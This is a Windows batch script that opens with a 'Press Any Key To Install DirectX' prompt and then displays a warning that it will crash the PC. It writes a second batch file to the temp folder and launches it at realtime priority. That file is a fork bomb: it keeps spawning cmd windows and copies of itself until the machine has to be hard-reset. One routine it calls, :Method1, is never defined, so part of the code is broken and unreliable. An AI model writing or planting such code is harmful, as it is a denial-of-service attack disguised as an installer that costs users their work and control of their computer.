@echo off
::::::::::::::::::::::
:: Booting Proccess ::
::::::::::::::::::::::
:: Initiate The Chosen Installs(s)
echo Press Any Key To Install DirectX
pause >nul
:Initiate
mode con: lines=19
color f0
cls
echo.
echo  ��������������������������������� ��������������������������������������������
echo  �               �               � �   THIS INSTALLATION WILL CRASH THIS PC , �
echo  �              ���              � �     So Save Any Unsaved Work Before      �
echo  �             �����             � �  Advancing. Perform This Attack At YOUR  �
echo  �            �������            � �  OWN RISK! In Order To Get Control Over  �
echo  �           ���������           � � This PC, You Will Have To Hard-Reset It. �
echo  �          ����   ����          � � ---------------------------------------- �
echo  �         �����   �����         � �  TO PERFORM A HARD RESET, Hold Down The  �
echo  �        ������   ������        � �    Power Button On This PC For A Few     �
echo  �       �������   �������       � �      Seconds, Then Reboot Normally.      �
echo  �      �������������������      � ��������������������������������������������
echo  �     ���������������������     � �                                          �
echo  �    ����������   ����������    � � If You Accept This And Want To Continue, �
echo  �   �����������   �����������   � �          -PRESS ANY KEY 5 TIMES-         �
echo  �  ���������������������������  � �           ~~~~~~~~~~~~~~~~~~~~~          �
echo  � ����������������������������� � �                                          �
echo  ��������������������������������� ��������������������������������������������
call :WAIT
color f7
call :WAIT
color f8
call :WAIT
color 70
call :WAIT
color 80
call :WAIT
color 0C
pushd %temp%
if exist "WinAttack*.bat" del /F /Q WinAttack*.bat >nul 2>&1
set "Start=start /min /realtime "Reboot""
call :Method4
%start% "WinAttack4.bat"
timeout 1 >nul
echo Remember to hold down power button!
popd
timeout 10 >nul
goto :end
:: WinAttack Method 4 -WinAttack Hybrid-
:Method4
call :Method1
(echo ^@echo off
echo title -WINATTACK HYBRID- %WinTitle%
echo %Start% WinAttack1.bat
echo :Fork
echo %Start% cmd^&%Start% %%0^&%Start% %%0
echo goto :Fork)> "WinAttack4.bat"
goto :EOF
:WAIT
ping -ds >nul 2>&1
ping -ds >nul 2>&1
goto :EOF
:end
popd